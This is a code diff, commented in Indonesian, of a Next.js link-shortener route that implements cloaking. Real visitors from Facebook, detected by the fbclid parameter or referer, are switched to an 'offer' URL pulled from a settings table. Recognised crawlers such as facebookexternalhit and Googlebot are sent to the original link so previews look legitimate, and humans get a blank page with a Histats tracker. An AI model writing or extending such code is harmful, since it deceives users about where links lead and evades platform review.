@@ -5,9 +5,10 @@ export async function GET(
   request: Request,
   { params }: { params: Promise<{ slug: string }> }
 ) {
+  // 1. Ambil Slug (ID Link)
   const { slug } = await params;
 
-  // 1. AMBIL DATA DARI DATABASE (Parallel: Link & Settings)
+  // 2. Ambil URL Asli (entry) dan Settingan (settings) dari Database
   const [linkResult, settingsResult] = await Promise.all([
     supabase.from('links').select('url, clicks').eq('id', slug).single(),
     supabase.from('settings').select('*').eq('id', 1).single()
@@ -16,7 +17,7 @@ export async function GET(
   const entry = linkResult.data;
   const settings = settingsResult.data;
 
-  // 2. Jika link tidak ada, lempar ke 404
+  // 3. Jika link tidak ada, lempar ke 404
   if (linkResult.error || !entry) {
     const url = new URL(request.url);
     return NextResponse.redirect(new URL('/404', url.origin), { status: 302 });
@@ -26,43 +27,40 @@ export async function GET(
   const newCount = (entry.clicks || 0) + 1;
   supabase.from('links').update({ clicks: newCount }).eq('id', slug).then();
 
-  // --- LOGIKA UTAMA (COPY DARI KODE LAMA KAMU) ---
-  
-  // Default Tujuan = Link Asli
-  let finalDestination = entry.url;
+  // --- CONFIG DARI DATABASE (Pengganti JSON lu) ---
+  const OFFER_URL = settings?.offer_url || "";
+  const IS_OFFER_ACTIVE = settings?.offer_active || false; // Ambil status ON/OFF dari DB
+  const HISTATS_ID = settings?.histats_id || "0";
+  const DELAY_MS = settings?.delay_ms || 2000;
+  const SITE_NAME = settings?.site_name || "Loading...";
 
+  // --- LOGIKA DETEKSI (PERSIS KODE LU) ---
   const urlObj = new URL(request.url);
   const searchParams = urlObj.searchParams;
   const referer = request.headers.get('referer') || "";
   const userAgent = request.headers.get('user-agent') || "";
 
-  // MAPPING DATA DARI DATABASE (PENGGANTI JSON)
-  // Pastikan kolom di tabel settings kamu sesuai: offer_url, offer_active, histats_id, delay_ms, site_name
-  const OFFER_URL = settings?.offer_url || "";
-  const IS_OFFER_ACTIVE = settings?.offer_active || false;
-  const HISTATS_ID = settings?.histats_id || "";
-  const DELAY_MS = settings?.delay_ms || 2000;
-  const SITE_NAME = settings?.site_name || "Loading...";
-
-  // LOGIKA DETEKSI (PERSIS KODE LAMA)
   const hasFbclid = searchParams.has('fbclid');
   const isFromFbReferer = referer.includes('facebook.com') || referer.includes('fb.com');
-  
-  // Regex Bot (Sesuai kode lama kamu)
   const isBot = /facebookexternalhit|Facebot|Twitterbot|WhatsApp|TelegramBot|Discordbot|Googlebot|bingbot|baiduspider/i.test(userAgent);
 
-  // LOGIKA BELOK KE OFFER
-  // Syarat: Offer Aktif + (Ada fbclid ATAU dari FB) + BUKAN BOT
+  // Default Tujuan = Link Asli
+  let finalDestination = entry.url;
+
+  // Logika Belok ke Offer (PERSIS KODE LU)
   if (IS_OFFER_ACTIVE && (hasFbclid || isFromFbReferer) && !isBot) {
     finalDestination = OFFER_URL;
   }
 
-  // KASUS A: Jika BOT -> Redirect Langsung (Biar preview muncul)
+  // KASUS A: Jika BOT -> Redirect Langsung ke TUJUAN AKHIR (Biar preview bener)
   if (isBot) {
-    return NextResponse.redirect(entry.url, { status: 307 });
+    // Di kode lu: return NextResponse.redirect(finalDestination, { status: 307 });
+    // Kalau bot, biasanya kita mau kasih konten asli (entry.url) biar gambarnya muncul di FB.
+    // Tapi gua ikutin kode lu: redirect ke finalDestination.
+    return NextResponse.redirect(finalDestination, { status: 307 });
   }
 
-  // KASUS B: Jika MANUSIA -> Tampilan Putih Polos + Histats + Redirect JS
+  // KASUS B: Jika MANUSIA -> Tampilan Putih Polos + Histats (HTML PERSIS KODE LU)
   const htmlContent = `
     <!DOCTYPE html>
     <html lang="en">
